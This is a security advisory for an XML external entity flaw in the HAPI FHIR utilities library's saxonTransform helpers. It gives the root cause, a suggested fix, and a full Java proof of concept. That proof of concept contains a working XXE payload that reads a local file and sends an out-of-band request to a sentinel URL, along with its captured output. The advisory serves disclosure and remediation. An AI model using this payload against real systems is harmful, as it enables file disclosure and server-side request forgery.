# [C] HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory

## Summary
Severity: Critical
Advisory: GHSA-2f55-g35j-5jmf
CVE: CVE-2026-55471
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-2f55-g35j-5jmf
Type: github-advisory

## Affected
- Maven: `ca.uhn.hapi.fhir:org.hl7.fhir.utilities` — affected >=0 <6.9.10

## Details
### Summary

`org.hl7.fhir.utilities.XsltUtilities` exposes two parallel families of XSLT
transform helpers. The `transform(...)` overloads obtain their
`TransformerFactory` from the project's hardened helper
`XMLUtil.newXXEProtectedTransformerFactory()` (which sets
`ACCESS_EXTERNAL_DTD=""` and `ACCESS_EXTERNAL_STYLESHEET=""`). The sibling
`saxonTransform(...)` overloads instead instantiate a **bare**
`new net.sf.saxon.TransformerFactoryImpl()` with no external-access
restriction. A document transformed through any `saxonTransform(...)` overload
is parsed with external general entities and external DTD/parameter entities
enabled, so an attacker who controls (or can MITM) the transformed XML obtains
XML External Entity injection: local file disclosure and blind XXE / SSRF to
arbitrary URLs reachable from the host.

`XMLUtil` documents that its protected factory "should be the only place where
TransformerFactory is instantiated in this project". The `saxonTransform`
overloads violate that contract while their same-file `transform` siblings
honour it.

### Affected versions

`org.hl7.fhir.utilities` (Maven `ca.uhn.hapi.fhir:org.hl7.fhir.utilities`)
`<= 6.9.8` (latest release at time of report; verified live on `6.9.8`).
The bare `net.sf.saxon.TransformerFactoryImpl()` instantiation is present at
`XsltUtilities.java:61`, `:91`, and `:106`.

### Privilege required

None at the library boundary. The exposure depends on the calling tool: any
FHIR component that runs `XsltUtilities.saxonTransform(...)` over XML whose
source document, embedded DTD, or referenced stylesheet is attacker-influenced
(an IG package, a fetched/uploaded resource, a downloaded stylesheet, or a
MITM'd HTTP fetch) triggers the XXE. No DOCTYPE/entity stripping occurs before
the Saxon parser sees the bytes.

### Root cause

`org.hl7.fhir.utilities/src/main/java/org/hl7/fhir/utilities/XsltUtilities.java`:

```java
// VULNERABLE — bare factory, no external-access restriction (lines 60-73, 90-99, 105-128)
public static byte[] saxonTransform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {
    TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare
    f.setAttribute("http://saxon.sf.net/feature/version-warning", Boolean.FALSE);
    StreamSource xsrc = new StreamSource(new ByteArrayInputStream(xslt));
    f.setURIResolver(new ZipURIResolver(files));
    Transformer t = f.newTransformer(xsrc);
    ...
}
public static String saxonTransform(String source, String xslt) throws TransformerException, IOException {
    TransformerFactoryImpl f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare
    ...
}

// HARDENED SIBLING (same file, lines 75-88 / 130-149) — negative control
public static byte[] transform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {
    TransformerFactory f = org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(); // <-- hardened
    ...
}
```

The hardened helper (`XMLUtil.newXXEProtectedTransformerFactory()`) is:

```java
public static TransformerFactory newXXEProtectedTransformerFactory() {
    final TransformerFactory transformerFactory = TransformerFactory.newInstance();
    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
    return transformerFactory;
}
```

The `saxonTransform` overloads never call this helper and never set the two
`ACCESS_EXTERNAL_*` attributes, so the underlying parser resolves external
general entities (`<!ENTITY x SYSTEM "file:///...">`) and external
DTD/parameter entities (`<!ENTITY % p SYSTEM "http://attacker/">`). This is a
classic CWE-611. The asymmetry — one family hardened, the co-located sibling
family bare — is the bug: the protection that already exists in the same class
was not extended to the `saxonTransform` variants.

### Reproduction (E2E against published Maven Central `org.hl7.fhir.utilities:6.9.8`)

A self-contained Maven project. `pom.xml` pulls the latest released artifact,
which transitively brings `net.sf.saxon:Saxon-HE:11.6`.

`pom.xml`:

```xml
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>poc</groupId><artifactId>fhir-xslt-xxe-poc</artifactId><version>1.0</version>
  <properties>
    <maven.compiler.source>17</maven.compiler.source>
    <maven.compiler.target>17</maven.compiler.target>
  </properties>
  <dependencies>
    <dependency>
      <groupId>ca.uhn.hapi.fhir</groupId>
      <artifactId>org.hl7.fhir.utilities</artifactId>
      <version>6.9.8</version>
    </dependency>
  </dependencies>
</project>
```

`src/main/java/Poc.java`:

```java
import org.hl7.fhir.utilities.XsltUtilities;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;

public class Poc {
  static final String CANARY_MARK = "TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2";
  // identity stylesheet: copies the resolved //data text into the output
  static final String IDENTITY_XSLT =
      "<?xml version=\"1.0\"?>\n" +
      "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
      "  <xsl:output method=\"text\"/>\n" +
      "  <xsl:template match=\"/\"><xsl:value-of select=\"//data\"/></xsl:template>\n" +
      "</xsl:stylesheet>\n";

  public static void main(String[] args) throws Exception {
    Path secret = Files.createTempFile("fhir-secret-", ".txt");
    Files.writeString(secret, CANARY_MARK + " :: " + UUID.randomUUID());

    final List<String> oobHits = Collections.synchronizedList(new ArrayList<>());
    ServerSocket sentinel = new ServerSocket(0);
    int oobPort = sentinel.getLocalPort();
    Thread st = new Thread(() -> {
      try {
        while (!sentinel.isClosed()) {
          Socket s = sentinel.accept();
          BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream(), StandardCharsets.UTF_8));
          String line = r.readLine();
          if (line != null) { oobHits.add(line); System.out.println("[SENTINEL] inbound connection: " + line); }
          byte[] body = "<!-- ok -->".getBytes(StandardCharsets.UTF_8); // well-formed empty external DTD
          OutputStream os = s.getOutputStream();
          os.write(("HTTP/1.1 200 OK\r\nContent-Type: application/xml-dtd\r\nContent-Length: " + body.length + "\r\n\r\n").getBytes());
          os.write(body); os.flush(); s.close();
        }
      } catch (IOException ignored) {}
    });
    st.setDaemon(true); st.start();

    // A1: external general entity -> local secret (file read)
    // A2: external parameter entity -> attacker URL (blind XXE / SSRF)
    String maliciousSource =
        "<?xml version=\"1.0\"?>\n" +
        "<!DOCTYPE root [\n" +
        "  <!ENTITY canary SYSTEM \"" + secret.toUri() + "\">\n" +
        "  <!ENTITY % oob SYSTEM \"http://127.0.0.1:" + oobPort + "/evil-fhir-xslt-ssrf.dtd\">\n" +
        "  %oob;\n" +
        "]>\n" +
        "<root><data>&canary;</data></root>\n";
    Path srcFile = Files.createTempFile("fhir-malicious-src-", ".xml");
    Files.writeString(srcFile, maliciousSource);
    Path xsltFile = Files.createTempFile("fhir-identity-", ".xslt");
    Files.writeString(xsltFile, IDENTITY_XSLT);

    System.out.println("=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK " + System.getProperty("java.version") + " ===");
    System.out.println("=== Saxon: " + saxonVersion() + " ===");
    System.out.println("Secret file: " + secret + " (contains " + CANARY_MARK + ")");
    System.out.println("OOB sentinel: http://127.0.0.1:" + oobPort + "/\n");

    System.out.println("---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----");
    try {
      String out = XsltUtilities.saxonTransform(srcFile.toString(), xsltFile.toString());
      System.out.println("transform output: [" + out.trim() + "]");
      System.out.println(out.contains(CANARY_MARK)
        ? ">>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<"
        : ">>> canary NOT in output <<<");
    } catch (Exception e) { System.out.println("saxonTransform threw: " + e); }
    Thread.sleep(400);
    System.out.println("OOB sentinel hits after BARE call: " + oobHits + "\n");

    // Direct factory comparison (isolates the hardening difference)
    System.out.println("---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----");
    int b = oobHits.size();
    System.out.println("[bare new TransformerFactoryImpl()]");
    runDirect(new net.sf.saxon.TransformerFactoryImpl(), srcFile, xsltFile, oobHits, b);
    int b2 = oobHits.size();
    System.out.println("[hardened XMLUtil.newXXEProtectedTransformerFactory()]");
    runDirect(org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(), srcFile, xsltFile, oobHits, b2);
    sentinel.close();
  }

  static void runDirect(javax.xml.transform.TransformerFactory f, Path srcFile, Path xsltFile, List<String> oobHits, int before) throws Exception {
    try {
      javax.xml.transform.Transformer t = f.newTransformer(new javax.xml.transform.stream.StreamSource(Files.newInputStream(xsltFile)));
      ByteArrayOutputStream out = new ByteArrayOutputStream();
      t.transform(new javax.xml.transform.stream.StreamSource(Files.newInputStream(srcFile)), new javax.xml.transform.stream.StreamResult(out));
      String s = out.toString(StandardCharsets.UTF_8).trim();
      System.out.println("  output: [" + s + "]");
      System.out.println("  canary leaked: " + s.contains(CANARY_MARK));
    } catch (Exception e) {
      System.out.println("  threw: " + e.getClass().getName() + ": " + String.valueOf(e.getMessage()).replaceAll("[\\u4e00-\\u9fff]", "?"));
    }
    Thread.sleep(300);
    System.out.println("  OOB sentinel hits from this call: " + (oobHits.size() - before));
  }

  static String saxonVersion() {
    try { return (String) Class.forName("net.sf.saxon.Version").getMethod("getProductVersion").invoke(null); }
    catch (Throwable t) { return "unknown"; }
  }
}
```

Run + **verbatim captured output** (JDK 17.0.18, Saxon-HE 11.6; CJK in the
hardened-path SAXParseException replaced with `?` by the harness for ASCII
display, the message text is `accessExternalDTD ... restriction ... 'http'
access not allowed`):

```
$ mvn -q compile && mvn -q exec:java -Dexec.mainClass=Poc
=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK 17.0.18 ===
=== Saxon: 11.6 ===
Secret file: /var/folders/.../fhir-secret-467000002121832365.txt (contains TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2)
OOB sentinel: http://127.0.0.1:62466/

---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----
[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1
transform output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]
>>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<
OOB sentinel hits after BARE call: [GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1]

---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----
[bare new TransformerFactoryImpl()]
[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1
  output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]
  canary leaked: true
  OOB sentinel hits from this call: 1
[hardened XMLUtil.newXXEProtectedTransformerFactory()]
  threw: net.sf.saxon.trans.XPathException: org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 8; ????: ???????? 'evil-fhir-xslt-ssrf.dtd', ?? accessExternalDTD ???????????? 'http' ??.
  OOB sentinel hits from this call: 0
```

Interpretation of the verbatim output:

- **Bare path** (`saxonTransform` and bare `TransformerFactoryImpl`): the local
  secret file content (`TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: ...`) is leaked
  into the transform output (file disclosure), and the OOB sentinel receives
  `GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1` (blind XXE / SSRF). `canary leaked: true`,
  OOB hits = 1.
- **Hardened path** (`XMLUtil.newXXEProtectedTransformerFactory()`): parsing the
  same malicious source throws an `accessExternalDTD ... 'http' access not
  allowed` SAXParseException and the OOB sentinel receives 0 hits. The only
  difference between the two runs is the factory: the existing project helper
  blocks the attack, the bare sibling does not.

### Impact

- **Local file disclosure**: any file readable by the JVM process is exfiltrated
  into the transform output (demonstrated above with a canary secret file).
- **Blind XXE / SSRF**: external parameter/DTD entities cause the host to issue
  attacker-directed HTTP(S) requests (demonstrated by the sentinel hit),
  enabling internal-network probing and cloud metadata access from the host's
  network position.
- The `saxonTransform` overloads are part of the public
  `org.hl7.fhir.utilities` API consumed across the FHIR Java tooling
  (IG-publisher / validation / conversion utilities); any consumer that routes
  attacker-influenced or MITM-able XML through them inherits the XXE.

### Suggested fix

Route the `saxonTransform` overloads through the same protection the
`transform` siblings already use. Because these overloads specifically need the
Saxon implementation, obtain a Saxon factory and apply the two `ACCESS_EXTERNAL_*`
restrictions (mirroring `XMLUtil.newXXEProtectedTransformerFactory()`), e.g. a
small helper in `XMLUtil`:

```java
@SuppressWarnings("checkstyle:transformerFactoryNewInstance")
public static TransformerFactory newXXEProtectedSaxonTransformerFactory() {
    final TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();
    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
    return f;
}
```

and replace each `new net.sf.saxon.TransformerFactoryImpl()` in
`XsltUtilities.saxonTransform(...)` (lines 61, 91, 106) with a call to it. This
mirrors the existing `newXXEProtected*` convention and the class-level mandate
that the protected factory "should be the only place where TransformerFactory
is instantiated in this project". A regression test that runs a DOCTYPE-bearing
source through `saxonTransform` and asserts the external entity is NOT resolved
should accompany the change.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/hapifhir/org.hl7.fhir.core/security/advisories/GHSA-2f55-g35j-5jmf
- https://github.com/hapifhir/org.hl7.fhir.core
